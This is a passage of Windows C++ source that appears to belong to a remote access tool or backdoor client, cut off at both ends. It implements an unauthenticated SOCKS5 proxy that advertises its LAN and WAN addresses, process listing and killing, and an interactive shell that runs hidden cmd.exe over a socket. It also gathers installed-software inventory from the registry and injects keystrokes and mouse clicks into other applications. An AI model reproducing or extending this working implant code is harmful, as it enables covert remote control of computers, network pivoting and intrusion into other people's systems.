        char error_response[10] = {0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        send(client_socket, error_response, 10, 0);
        return false;
    }
    
    // Send success response
    char success_response[10] = {0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    if (send(client_socket, success_response, 10, 0) != 10) {
        closesocket(target_socket);
        return false;
    }
    
    // Start data relay
    socks5_relay_data(client_socket, target_socket);
    
    closesocket(target_socket);
    return true;
}

// Relay data between client and target sockets
void socks5_relay_data(SOCKET client_socket, SOCKET target_socket) {
    fd_set read_fds;
    char buffer[4096];
    int max_fd = (client_socket > target_socket) ? client_socket : target_socket;
    
    // Set sockets to non-blocking mode
    u_long mode = 1;
    ioctlsocket(client_socket, FIONBIO, &mode);
    ioctlsocket(target_socket, FIONBIO, &mode);
    
    while (true) {
        FD_ZERO(&read_fds);
        FD_SET(client_socket, &read_fds);
        FD_SET(target_socket, &read_fds);
        
        struct timeval timeout;
        timeout.tv_sec = 30; // 30 second timeout
        timeout.tv_usec = 0;
        
        int activity = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        
        if (activity <= 0) {
            break; // Timeout or error
        }
        
        // Check for data from client to target
        if (FD_ISSET(client_socket, &read_fds)) {
            int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
            if (bytes_received <= 0) {
                break;
            }
            
            int bytes_sent = 0;
            while (bytes_sent < bytes_received) {
                int sent = send(target_socket, buffer + bytes_sent, bytes_received - bytes_sent, 0);
                if (sent <= 0) {
                    return;
                }
                bytes_sent += sent;
            }
        }
        
        // Check for data from target to client
        if (FD_ISSET(target_socket, &read_fds)) {
            int bytes_received = recv(target_socket, buffer, sizeof(buffer), 0);
            if (bytes_received <= 0) {
                break;
            }
            
            int bytes_sent = 0;
            while (bytes_sent < bytes_received) {
                int sent = send(client_socket, buffer + bytes_sent, bytes_received - bytes_sent, 0);
                if (sent <= 0) {
                    return;
                }
                bytes_sent += sent;
            }
        }
    }
}

// SOCKS5 client handler thread
DWORD WINAPI socks5_client_handler_thread(LPVOID lpParam) {
    SOCKS5ClientData* client_data = (SOCKS5ClientData*)lpParam;
    SOCKET client_socket = client_data->client_socket;
    
    // Handle SOCKS5 authentication
    if (!socks5_handle_authentication(client_socket)) {
        closesocket(client_socket);
        delete client_data;
        return 0;
    }
    
    // Handle connection request and relay data
    socks5_handle_connection_request(client_socket);
    
    closesocket(client_socket);
    delete client_data;
    return 0;
}

// SOCKS5 proxy server thread
DWORD WINAPI socks5_proxy_server_thread(LPVOID lpParam) {
    int port = *(int*)lpParam;
    
    // Create server socket
    SOCKET server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        EnterCriticalSection(&g_proxy_cs);
        g_proxy_active = false;
        LeaveCriticalSection(&g_proxy_cs);
        return 0;
    }
    
    // Set socket options
    int opt = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    
    // Bind to port
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    
    if (bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(server_socket);
        EnterCriticalSection(&g_proxy_cs);
        g_proxy_active = false;
        LeaveCriticalSection(&g_proxy_cs);
        return 0;
    }
    
    // Listen for connections
    if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(server_socket);
        EnterCriticalSection(&g_proxy_cs);
        g_proxy_active = false;
        LeaveCriticalSection(&g_proxy_cs);
        return 0;
    }
    
    EnterCriticalSection(&g_proxy_cs);
    g_proxy_socket = server_socket;
    g_proxy_port = port;
    LeaveCriticalSection(&g_proxy_cs);
    
    // Accept client connections
    while (true) {
        EnterCriticalSection(&g_proxy_cs);
        bool should_continue = g_proxy_active;
        LeaveCriticalSection(&g_proxy_cs);
        
        if (!should_continue) {
            break;
        }
        
        sockaddr_in client_addr;
        int client_addr_len = sizeof(client_addr);
        SOCKET client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_addr_len);
        
        if (client_socket == INVALID_SOCKET) {
            if (WSAGetLastError() == WSAEINTR) {
                break; // Server socket was closed
            }
            continue;
        }
        
        // Create client data structure
        SOCKS5ClientData* client_data = new SOCKS5ClientData;
        client_data->client_socket = client_socket;
        client_data->client_addr = client_addr;
        
        // Create thread to handle client
        HANDLE client_thread = CreateThread(
            NULL,
            0,
            socks5_client_handler_thread,
            client_data,
            0,
            NULL
        );
        
        if (client_thread != NULL) {
            EnterCriticalSection(&g_proxy_cs);
            g_proxy_client_threads.push_back(client_thread);
            g_proxy_client_sockets.push_back(client_socket);
            LeaveCriticalSection(&g_proxy_cs);
        } else {
            closesocket(client_socket);
            delete client_data;
        }
    }
    
    closesocket(server_socket);
    return 0;
}

// Start SOCKS5 proxy server
std::string start_socks5_proxy(int port) {
    EnterCriticalSection(&g_proxy_cs);
    
    if (g_proxy_active) {
        LeaveCriticalSection(&g_proxy_cs);
        return "SOCKS5 proxy is already running on port " + std::to_string(g_proxy_port);
    }
    
    // If no port specified, get an available one
    if (port == 0) {
        port = get_available_port();
        if (port == 0) {
            LeaveCriticalSection(&g_proxy_cs);
            return "Failed to find available port for SOCKS5 proxy";
        }
    }
    
    g_proxy_active = true;
    LeaveCriticalSection(&g_proxy_cs);
    
    // Create proxy server thread
    int* port_param = new int(port);
    g_proxy_thread = CreateThread(
        NULL,
        0,
        socks5_proxy_server_thread,
        port_param,
        0,
        NULL
    );
    
    if (g_proxy_thread == NULL) {
        EnterCriticalSection(&g_proxy_cs);
        g_proxy_active = false;
        LeaveCriticalSection(&g_proxy_cs);
        delete port_param;
        return "Failed to create SOCKS5 proxy server thread";
    }
    
    // Wait a moment for the server to start
    Sleep(500);
    
    return get_proxy_configuration_info(port);
}

// Stop SOCKS5 proxy server
std::string stop_socks5_proxy() {
    EnterCriticalSection(&g_proxy_cs);
    
    if (!g_proxy_active) {
        LeaveCriticalSection(&g_proxy_cs);
        return "SOCKS5 proxy is not running";
    }
    
    g_proxy_active = false;
    
    // Close server socket to stop accepting new connections
    if (g_proxy_socket != INVALID_SOCKET) {
        closesocket(g_proxy_socket);
        g_proxy_socket = INVALID_SOCKET;
    }
    
    // Close all client sockets
    for (SOCKET client_socket : g_proxy_client_sockets) {
        closesocket(client_socket);
    }
    g_proxy_client_sockets.clear();
    
    LeaveCriticalSection(&g_proxy_cs);
    
    // Wait for server thread to finish
    if (g_proxy_thread != NULL) {
        WaitForSingleObject(g_proxy_thread, 3000); // 3 second timeout
        CloseHandle(g_proxy_thread);
        g_proxy_thread = NULL;
    }
    
    // Wait for client threads to finish
    EnterCriticalSection(&g_proxy_cs);
    for (HANDLE client_thread : g_proxy_client_threads) {
        WaitForSingleObject(client_thread, 1000); // 1 second timeout per thread
        CloseHandle(client_thread);
    }
    g_proxy_client_threads.clear();
    LeaveCriticalSection(&g_proxy_cs);
    
    g_proxy_port = 0;
    
    return "SOCKS5 proxy stopped successfully";
}

// Get proxy status
std::string get_proxy_status() {
    EnterCriticalSection(&g_proxy_cs);
    
    if (!g_proxy_active) {
        LeaveCriticalSection(&g_proxy_cs);
        return "SOCKS5 proxy is not running";
    }
    
    int port = g_proxy_port;
    int active_connections = g_proxy_client_sockets.size();
    
    LeaveCriticalSection(&g_proxy_cs);
    
    std::string local_ip = get_local_ip();
    std::string public_ip = get_public_ip();
    
    std::string status = "SOCKS5 proxy is running on port " + std::to_string(port) + "\n";
    status += "Active connections: " + std::to_string(active_connections) + "\n\n";
    status += "=== AVAILABLE PROXY ADDRESSES ===\n";
    status += "LAN Access: " + local_ip + ":" + std::to_string(port) + "\n";
    status += "WAN Access: " + public_ip + ":" + std::to_string(port) + "\n";
    status += "Localhost: 127.0.0.1:" + std::to_string(port) + "\n\n";
    status += "Authentication: None required\n";
    status += "Protocol: SOCKS5";
    
    return status;
}

// ============================================================================
// END SOCKS5 PROXY IMPLEMENTATION
// ============================================================================

// List all running processes
std::string list_processes()
{
    std::string process_list = "Running Processes:\n";
    process_list += "PID\tProcess Name\n";
    process_list += "------------------------\n";

    // Take a snapshot of all processes
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return "Failed to create process snapshot";
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return "Failed to get process information";
    }

    // Iterate through all processes
    do
    {
// No need to convert - pe32.szExeFile is already a char array in ANSI builds
// and a wchar_t array in Unicode builds
#ifdef UNICODE
        // Convert wide string to narrow string if in Unicode mode
        char narrow_name[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, narrow_name, MAX_PATH, NULL, NULL);
        process_list += std::to_string(pe32.th32ProcessID) + "\t" + std::string(narrow_name) + "\n";
#else
        // In ANSI mode, just use the string directly
        process_list += std::to_string(pe32.th32ProcessID) + "\t" + std::string(pe32.szExeFile) + "\n";
#endif
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return process_list;
}

// Helper function to get the actual PID of a running process by name
DWORD GetActualProcessIdByName(const std::string &processName)
{
    DWORD processes[1024], bytesReturned, processCount;
    if (!EnumProcesses(processes, sizeof(processes), &bytesReturned))
    {
        return 0;
    }

    processCount = bytesReturned / sizeof(DWORD);
    std::string lowerProcessName = processName;
    std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

    for (DWORD i = 0; i < processCount; i++)
    {
        if (processes[i] != 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProcess != NULL)
            {
                char processPath[MAX_PATH];
                if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH) > 0)
                {
                    std::string fullPath = processPath;
                    size_t lastSlash = fullPath.find_last_of("\\/");
                    std::string fileName = fullPath.substr(lastSlash + 1);

                    std::string lowerFileName = fileName;
                    std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);

                    if (lowerFileName.find(lowerProcessName) != std::string::npos)
                    {
                        CloseHandle(hProcess);
                        return processes[i];
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    return 0;
}

// Improved start_process function that tracks the actual PID
std::string start_process(const std::string &command)
{
    std::string processCommand = command;
    std::string processName;

    // Extract process name for PID tracking
    size_t lastSlash = command.find_last_of("\\/");
    if (lastSlash != std::string::npos)
    {
        processName = command.substr(lastSlash + 1);
    }
    else
    {
        processName = command;
    }

    // Remove extension if present
    size_t dotPos = processName.find_last_of(".");
    if (dotPos != std::string::npos)
    {
        processName = processName.substr(0, dotPos);
    }

    // If the command doesn't contain path separators, try to find it in common locations
    if (command.find('\\') == std::string::npos && command.find('/') == std::string::npos)
    {
        // First try in Start Menu Programs folder
        std::string startMenuPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\";
        std::string possiblePath = startMenuPath + command + ".lnk";

        if (GetFileAttributesA(possiblePath.c_str()) != INVALID_FILE_ATTRIBUTES)
        {
            // Found a shortcut, use it
            processCommand = possiblePath;
        }

        // If still not found, check common Windows applications
        if (processCommand == command)
        {
            if (_stricmp(command.c_str(), "notepad") == 0 ||
                _stricmp(command.c_str(), "notepad.exe") == 0)
            {
                processCommand = "C:\\Windows\\System32\\notepad.exe";
                processName = "notepad";
            }
            else if (_stricmp(command.c_str(), "calc") == 0 ||
                     _stricmp(command.c_str(), "calc.exe") == 0)
            {
                processCommand = "C:\\Windows\\System32\\calc.exe";
                processName = "calc";
            }
            else if (_stricmp(command.c_str(), "notepad++") == 0 ||
                     _stricmp(command.c_str(), "notepad++.exe") == 0)
            {
                // Try common Notepad++ installation paths
                std::vector<std::string> possiblePaths = {
                    "C:\\Program Files\\Notepad++\\notepad++.exe",
                    "C:\\Program Files (x86)\\Notepad++\\notepad++.exe"};

                for (const auto &path : possiblePaths)
                {
                    if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES)
                    {
                        processCommand = path;
                        processName = "notepad++";
                        break;
                    }
                }
            }
        }
    }

    // Get initial PIDs before launching
    std::vector<DWORD> initialPids;
    DWORD processes[1024], bytesReturned;
    if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
    {
        DWORD processCount = bytesReturned / sizeof(DWORD);
        for (DWORD i = 0; i < processCount; i++)
        {
            if (processes[i] != 0)
            {
                initialPids.push_back(processes[i]);
            }
        }
    }

    // Try ShellExecute first - this handles shortcuts (.lnk files) properly
    HINSTANCE result = ShellExecuteA(NULL, "open", processCommand.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if ((intptr_t)result > 32)
    {
        // Wait for the process to start
        Sleep(1000);

        // Find the new process by comparing PIDs
        DWORD newPid = 0;
        if (EnumProcesses(processes, sizeof(processes), &bytesReturned))
        {
            DWORD processCount = bytesReturned / sizeof(DWORD);
            for (DWORD i = 0; i < processCount; i++)
            {
                if (processes[i] != 0)
                {
                    // Check if this is a new PID
                    bool isNewPid = true;
                    for (DWORD oldPid : initialPids)
                    {
                        if (processes[i] == oldPid)
                        {
                            isNewPid = false;
                            break;
                        }
                    }

                    if (isNewPid)
                    {
                        // Check if this process matches our target
                        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
                        if (hProcess != NULL)
                        {
                            char processPath[MAX_PATH];
                            if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH) > 0)
                            {
                                std::string fullPath = processPath;
                                std::string fileName = fullPath.substr(fullPath.find_last_of("\\/") + 1);

                                // Convert to lowercase for comparison
                                std::string lowerFileName = fileName;
                                std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);

                                std::string lowerProcessName = processName;
                                std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

                                if (lowerFileName.find(lowerProcessName) != std::string::npos)
                                {
                                    newPid = processes[i];
                                    CloseHandle(hProcess);
                                    break;
                                }
                            }
                            CloseHandle(hProcess);
                        }
                    }
                }
            }
        }

        // If we found a PID, return it
        if (newPid != 0)
        {
            return "Process started successfully using ShellExecute: " + processCommand + " (Actual PID: " + std::to_string(newPid) + ")";
        }

        // If we couldn't find the PID, try to get it by name
        DWORD pidByName = GetActualProcessIdByName(processName);
        if (pidByName != 0)
        {
            return "Process started successfully using ShellExecute: " + processCommand + " (Actual PID: " + std::to_string(pidByName) + ")";
        }

        return "Process started successfully using ShellExecute: " + processCommand + " (PID unknown)";
    }

    // If all else fails, try CreateProcess
    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    char *cmd = _strdup(processCommand.c_str());
    BOOL success = CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    DWORD error = GetLastError();
    free(cmd);

    if (success)
    {
        DWORD initialPid = pi.dwProcessId;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Wait a moment for any child processes to start
        Sleep(1000);

        // Try to get the actual PID by name
        DWORD actualPid = GetActualProcessIdByName(processName);
        if (actualPid != 0 && actualPid != initialPid)
        {
            return "Process started successfully with initial PID: " + std::to_string(initialPid) +
                   " (Actual PID: " + std::to_string(actualPid) + ")";
        }

        return "Process started successfully with PID: " + std::to_string(initialPid);
    }
    return "Failed to start process: " + std::to_string(error) +
           " (Command: " + processCommand + ")";
}

// Terminate a process by PID
std::string terminate_process(const std::string &pid_str)
{
    DWORD pid = std::stoi(pid_str);
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

    if (hProcess == NULL)
    {
        return "Failed to open process with PID " + pid_str + ": " + std::to_string(GetLastError());
    }

    if (!TerminateProcess(hProcess, 1))
    {
        CloseHandle(hProcess);
        return "Failed to terminate process with PID " + pid_str + ": " + std::to_string(GetLastError());
    }

    CloseHandle(hProcess);
    return "Process with PID " + pid_str + " terminated successfully";
}

// Interactive shell execution with real-time output streaming
bool interactive_shell(SOCKET sock)
{
    // Create pipes for stdin, stdout, stderr
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hStdOutRd = NULL;
    HANDLE hStdOutWr = NULL;
    HANDLE hStdInRd = NULL;
    HANDLE hStdInWr = NULL;
    HANDLE hStdErrWr = NULL;

    // Create stdout pipe
    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0))
    {
        return false;
    }

    // Create stdin pipe
    if (!CreatePipe(&hStdInRd, &hStdInWr, &sa, 0))
    {
        CloseHandle(hStdOutRd);
        CloseHandle(hStdOutWr);
        return false;
    }

    // Create stderr pipe (redirect to stdout)
    hStdErrWr = hStdOutWr;

    // Set the inheritance properties
    SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdInWr, HANDLE_FLAG_INHERIT, 0);

    // Start the command processor
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hStdInRd;
    si.hStdOutput = hStdOutWr;
    si.hStdError = hStdErrWr;
    si.wShowWindow = SW_HIDE;

    // Start cmd.exe
    char cmdLine[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(hStdOutRd);
        CloseHandle(hStdOutWr);
        CloseHandle(hStdInRd);
        CloseHandle(hStdInWr);
        return false;
    }

    // Close unnecessary handles
    CloseHandle(hStdOutWr);
    CloseHandle(hStdInRd);
    CloseHandle(pi.hThread);

    // Send shell start marker
    const char* shell_start = "##SHELL_SESSION_STARTED##";
    send(sock, shell_start, strlen(shell_start), 0);

    // Create a thread to read from the socket and write to the process stdin
    HANDLE hReadThread = CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
        auto params = static_cast<std::pair<SOCKET, HANDLE>*>(param);
        SOCKET clientSock = params->first;
        HANDLE hStdInWr = params->second;
        
        char buffer[4096];
        int bytesReceived;
        
        while ((bytesReceived = recv(clientSock, buffer, sizeof(buffer) - 1, 0)) > 0)
        {
            // Handle different commands
            if (strncmp(buffer, "screenshot", 10) == 0) {
                // Send exit command to cmd.exe
                const char* exitCmd = "exit\r\n";
                DWORD bytesWritten;
                WriteFile(hStdInWr, exitCmd, strlen(exitCmd), &bytesWritten, NULL);
                break;
            }
            
            // Add newline to command
            std::string command = buffer;
            command += "\r\n";
            
            // Write to process stdin
            DWORD bytesWritten;
            if (!WriteFile(hStdInWr, command.c_str(), command.length(), &bytesWritten, NULL)) {
                break;
            }
        }
        
        delete params;
        return 0;
    }, new std::pair<SOCKET, HANDLE>(sock, hStdInWr), 0, NULL);

    // Read from process stdout and send to socket
    char buffer[4096];
    DWORD bytesRead;
    
    // Send initial prompt
    const char* prompt = "\r\nC:\\> ";
    send(sock, prompt, strlen(prompt), 0);
    
    while (true) {
        // Check if process is still running
        DWORD exitCode;
        if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
            break;
        }
        
        // Read from stdout
        if (!ReadFile(hStdOutRd, buffer, sizeof(buffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                break; // Pipe closed
            }
            Sleep(50);
            continue;
        }
        
        // Send to socket
        buffer[bytesRead] = '\0';
        send(sock, buffer, bytesRead, 0);
    }
    
    // Clean up
    CloseHandle(hReadThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hStdOutRd);
    CloseHandle(hStdInWr);
    
    // Send shell end marker
    const char* shell_end = "##SHELL_SESSION_ENDED##";
    send(sock, shell_end, strlen(shell_end), 0);
    
    return true;
}

// Add this new function to get installed software
std::string get_installed_software()
{
    std::string result = "=== INSTALLED SOFTWARE ===\n\n";

    HKEY hUninstKey = NULL;
    HKEY hAppKey = NULL;
    WCHAR sDisplayName[MAX_PATH];
    WCHAR sUninstallString[MAX_PATH];
    WCHAR sVersion[MAX_PATH];
    WCHAR sPublisher[MAX_PATH];
    WCHAR sInstallDate[MAX_PATH];
    WCHAR keyName[MAX_PATH];
    DWORD dwBufferSize = MAX_PATH;
    DWORD dwDataType = 0;

    // Open the uninstall key
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                      0, KEY_READ, &hUninstKey) != ERROR_SUCCESS)
    {
        return "Failed to open registry key for installed software.";
    }

    // Enumerate all uninstall keys
    for (DWORD i = 0; RegEnumKeyExW(hUninstKey, i, keyName, &dwBufferSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; i++)
    {
        dwBufferSize = MAX_PATH; // Reset buffer size for next iteration

        // Open the specific app key
        if (RegOpenKeyExW(hUninstKey, keyName, 0, KEY_READ, &hAppKey) != ERROR_SUCCESS)
            continue;

        // Get display name
        DWORD dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"DisplayName", NULL, &dwDataType, (LPBYTE)sDisplayName, &dwSize) != ERROR_SUCCESS)
        {
            RegCloseKey(hAppKey);
            continue; // Skip entries without a display name
        }

        // Get version
        dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"DisplayVersion", NULL, &dwDataType, (LPBYTE)sVersion, &dwSize) != ERROR_SUCCESS)
        {
            wcscpy_s(sVersion, L"N/A");
        }

        // Get publisher
        dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"Publisher", NULL, &dwDataType, (LPBYTE)sPublisher, &dwSize) != ERROR_SUCCESS)
        {
            wcscpy_s(sPublisher, L"Unknown");
        }

        // Get install date
        dwSize = MAX_PATH;
        if (RegQueryValueExW(hAppKey, L"InstallDate", NULL, &dwDataType, (LPBYTE)sInstallDate, &dwSize) != ERROR_SUCCESS)
        {
            wcscpy_s(sInstallDate, L"Unknown");
        }

        // Convert wide strings to narrow strings
        char displayName[MAX_PATH];
        char version[MAX_PATH];
        char publisher[MAX_PATH];
        char installDate[MAX_PATH];

        WideCharToMultiByte(CP_UTF8, 0, sDisplayName, -1, displayName, MAX_PATH, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, sVersion, -1, version, MAX_PATH, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, sPublisher, -1, publisher, MAX_PATH, NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, sInstallDate, -1, installDate, MAX_PATH, NULL, NULL);

        // Add to result with pipe delimiter for easier parsing
        result += std::string(displayName) + " | " + std::string(version) + " | " +
                  std::string(installDate) + " | " + std::string(publisher) + "\n";

        RegCloseKey(hAppKey);
    }

    RegCloseKey(hUninstKey);

    // Also check HKEY_CURRENT_USER for more software
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                      0, KEY_READ, &hUninstKey) == ERROR_SUCCESS)
    {
        // Same enumeration as above
        // (Code omitted for brevity - would be identical to the HKLM section)
        RegCloseKey(hUninstKey);
    }

    return result;
}

// Add these functions for application control
HWND FindApplicationWindow(const std::string &processNameOrId)
{
    // Check if the input is a numeric PID
    bool isPid = true;
    DWORD targetPid = 0;

    // Try to convert to PID, if it fails, it's a process name
    char* endptr;
    targetPid = strtoul(processNameOrId.c_str(), &endptr, 10);
    if (*endptr != '\0') {
        isPid = false;
    }

    if (isPid)
    {
        // Find window by PID
        HWND hwnd = NULL;
        HWND hwndTemp = GetTopWindow(NULL);

        while (hwndTemp != NULL)
        {
            DWORD pid = 0;
            GetWindowThreadProcessId(hwndTemp, &pid);

            if (pid == targetPid && IsWindowVisible(hwndTemp))
            {
                char className[256] = {0};
                GetClassNameA(hwndTemp, className, sizeof(className));

                // Skip certain system windows
                if (strcmp(className, "Shell_TrayWnd") != 0 &&
                    strcmp(className, "Button") != 0 &&
                    strcmp(className, "DummyDWMListenerWindow") != 0)
                {
                    // Check if this is a main window
                    if (GetWindow(hwndTemp, GW_OWNER) == NULL)
                    {
                        hwnd = hwndTemp;
                        break;
                    }
                }
            }

            hwndTemp = GetWindow(hwndTemp, GW_HWNDNEXT);
        }

        return hwnd;
    }

    // Original code for finding by process name
    HWND hwndTemp = FindWindowA(NULL, NULL);
    while (hwndTemp != NULL)
    {
        // Get process ID for this window
        DWORD pid;
        GetWindowThreadProcessId(hwndTemp, &pid);

        // Open the process
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess != NULL)
        {
            char processPath[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, NULL, processPath, MAX_PATH) > 0)
            {
                // Extract just the filename from the path
                std::string fullPath = processPath;
                size_t lastSlash = fullPath.find_last_of("\\/");
                std::string fileName = fullPath.substr(lastSlash + 1);

                // Convert to lowercase for case-insensitive comparison
                std::string lowerFileName = fileName;
                std::string lowerProcessName = processNameOrId;
                std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);
                std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

                // Check if this is the process we're looking for
                if (lowerFileName.find(lowerProcessName) != std::string::npos && IsWindowVisible(hwndTemp))
                {
                    CloseHandle(hProcess);
                    return hwndTemp;
                }
            }
            CloseHandle(hProcess);
        }

        // Also check window title
        char windowTitle[256];
        GetWindowTextA(hwndTemp, windowTitle, sizeof(windowTitle));
        std::string title = windowTitle;
        std::string lowerTitle = title;
        std::string lowerProcessName = processNameOrId;
        std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::tolower);
        std::transform(lowerProcessName.begin(), lowerProcessName.end(), lowerProcessName.begin(), ::tolower);

        if (lowerTitle.find(lowerProcessName) != std::string::npos && IsWindowVisible(hwndTemp))
        {
            return hwndTemp;
        }

        hwndTemp = GetWindow(hwndTemp, GW_HWNDNEXT);
    }
    return NULL;
}

// Forward declaration for processSpecialKey function
void processSpecialKey(const std::string &key, std::vector<INPUT> &inputs);

std::string send_keystrokes(const std::string &processNameOrId, const std::string &keys)
{
    HWND hwnd = FindApplicationWindow(processNameOrId);
    if (hwnd == NULL)
    {
        return "Failed to find window for process: " + processNameOrId;
    }

    // Get the process name for better reporting
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    char windowTitle[256] = {0};
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));

    // Try to bring window to foreground more aggressively
    // Sometimes SetForegroundWindow fails due to Windows restrictions
    DWORD foregroundThreadID = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
    DWORD currentThreadID = GetCurrentThreadId();

    // Attach threads to help with focus
    if (foregroundThreadID != currentThreadID)
    {
        AttachThreadInput(foregroundThreadID, currentThreadID, TRUE);
        BringWindowToTop(hwnd);
        SetForegroundWindow(hwnd);
        AttachThreadInput(foregroundThreadID, currentThreadID, FALSE);
    }
    else
    {
        BringWindowToTop(hwnd);
        SetForegroundWindow(hwnd);
    }

    // Wait longer for the window to become active
    Sleep(1000);

    // Use SendInput for more reliable input
    std::vector<INPUT> inputs;

    size_t i = 0;
    while (i < keys.length())
    {
        // Check for special key sequences in curly braces
        if (keys[i] == '{')
        {
            size_t endBrace = keys.find('}', i);
            if (endBrace != std::string::npos)
            {
                std::string specialKey = keys.substr(i, endBrace - i + 1);
                processSpecialKey(specialKey, inputs);
                i = endBrace + 1;
                continue;
            }
        }

        // Regular character processing
        char c = keys[i];
        SHORT vk = VkKeyScanA(c);
        BYTE vkCode = LOBYTE(vk);
        BYTE shiftState = HIBYTE(vk);

        // Add shift key down if needed
        if (shiftState & 1)
        {
            INPUT shiftDown = {0};
            shiftDown.type = INPUT_KEYBOARD;
            shiftDown.ki.wVk = VK_SHIFT;
            inputs.push_back(shiftDown);
        }

        // Key down
        INPUT keyDown = {0};
        keyDown.type = INPUT_KEYBOARD;
        keyDown.ki.wVk = vkCode;
        inputs.push_back(keyDown);

        // Key up
        INPUT keyUp = {0};
        keyUp.type = INPUT_KEYBOARD;
        keyUp.ki.wVk = vkCode;
        keyUp.ki.dwFlags = KEYEVENTF_KEYUP;
        inputs.push_back(keyUp);

        // Add shift key up if needed
        if (shiftState & 1)
        {
            INPUT shiftUp = {0};
            shiftUp.type = INPUT_KEYBOARD;
            shiftUp.ki.wVk = VK_SHIFT;
            shiftUp.ki.dwFlags = KEYEVENTF_KEYUP;
            inputs.push_back(shiftUp);
        }

        i++;
    }

    // Send all inputs
    if (!inputs.empty())
    {
        SendInput(inputs.size(), inputs.data(), sizeof(INPUT));
    }

    std::string windowInfo = windowTitle[0] ? std::string(" (Window: ") + windowTitle + ")" : "";
    return "Keystrokes sent to PID: " + std::to_string(pid) + windowInfo;
}

std::string click_at_position(const std::string &processName, int x, int y)
{
    HWND hwnd = FindApplicationWindow(processName);
    if (hwnd == NULL)
    {
        return "Failed to find window for process: " + processName;
    }

    // Bring window to foreground
    if (!SetForegroundWindow(hwnd))
    {
        return "Failed to set window to foreground";
    }

